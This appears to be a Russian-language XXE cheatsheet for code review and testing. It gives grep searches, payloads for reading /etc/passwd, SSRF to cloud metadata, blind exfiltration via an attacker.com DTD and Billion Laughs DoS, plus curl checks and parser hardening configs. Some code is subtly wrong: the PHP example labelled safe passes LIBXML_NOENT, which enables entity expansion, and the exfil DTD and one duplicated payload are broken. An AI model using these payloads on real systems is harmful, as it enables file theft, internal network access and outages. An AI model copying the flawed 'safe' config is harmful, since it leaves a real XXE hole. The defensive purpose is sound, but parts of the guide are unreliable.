# XXE Cheatsheet

> Быстрая справка по XML External Entity.

---

## Что искать на Code Review

```bash
# 1. Поиск XML-парсеров
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory\|TransformerFactory" src/ --include="*.java"
grep -rn "lxml\|xml.etree\|xml.dom\|minidom\|ElementTree\|SAXParser" src/ --include="*.py"
grep -rn "libxml\|xml2js\|xmldom\|sax\|expath\|xpath" src/ --include="*.js" --include="*.ts"
grep -rn "encoding/xml\|xml.Decoder\|xml.NewDecoder" src/ --include="*.go"

# 2. Поиск небезопасных настроек
grep -rn "setFeature.*external\|setFeature.*DOCTYPE" src/ --include="*.java"
grep -rn "resolve_entities.*True\|load_dtd.*True" src/ --include="*.py"

# 3. Поиск эндпоинтов, принимающих XML
grep -rn "consumes.*xml\|application/xml\|Content-Type.*xml" src/ --include="*.java"
grep -rn "@Consumes.*xml\|@Produces.*xml" src/ --include="*.java"
```

---

## Полезные payload для тестирования

### Чтение файлов

```xml
<!-- Чтение /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Чтение файла с переносом строк (Java) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### SSRF через XXE

```xml
<!-- SSRF к внутреннему сервису -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- SSRF к localhost -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)

```xml
<!-- Blind XXE — отправка данных на внешний сервер -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd">
  %xxe;
]>
<root>&send;</root>

<!-- exfil.dtd на сервере атакующего -->
<!ENTITY send SYSTEM "file:///etc/passwd?data=EXFIL">
```

### DoS (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

---

## Безопасные конфигурации

### Java

```java
// ✅ БЕЗОПАСНО — отключаем DOCTYPE, External Entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

```java
// ✅ БЕЗОПАСНО — SAXParser
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```java
// ✅ БЕЗОПАСНО — XMLInputFactory (StAX)
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

### Python

```python
# ✅ БЕЗОПАСНО — lxml
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
```

```python
# ✅ БЕЗОПАСНО — defusedxml (рекомендуется)
from defusedxml import etree
parser = etree.DefusedXMLParser()
```

### Node.js

```javascript
// ✅ БЕЗОПАСНО — libxmljs
const libxml = require('libxmljs');
const options = {
    noent: false,
    nonet: true,
    dtdload: false,
    dtdvalid: false
};
```

### Go

```go
// ✅ БЕЗОПАСНО — encoding/xml (безопасен по умолчанию)
// Go-парсер не обрабатывает DOCTYPE и external entities
import "encoding/xml"
```

### PHP

```php
// ✅ БЕЗОПАСНО
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NOENT);
```

---

## Проверка после фикса

```bash
# 1. Отправить XML с external entity
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# 2. Проверить SSRF через XXE
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><root>&xxe;</root>'

# 3. Проверить Billion Laughs
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">...]><root>&lol9;</root>'
```

---

## Типичные ошибки

| Ошибка | Почему не работает |
|--------|-------------------|
| Не отключён DOCTYPE | Позволяет объявлять внешние сущности |
| Отключены general entities, но не parameter entities | Parameter entities могут использоваться для Blind XXE |
| Не отключён XInclude | XInclude позволяет загружать внешние ресурсы |
| Отключено только на одном парсере | В приложении может быть несколько XML-парсеров |
| Нет мониторинга | Blind XXE можно не заметить без логирования |
| Парсер безопасен, но сервис имеет root-доступ | Даже чтение одного файла может быть критичным |

---

## Связанные CWE

| CWE | Описание |
|-----|----------|
| **CWE-611** | Improper Restriction of XML External Entity Reference |
| **CWE-827** | Improper Control of Document Type Definition |
| **CWE-776** | DoS via Entity Expansion (Billion Laughs) |
| **CWE-918** | SSRF (может быть следствием XXE) |
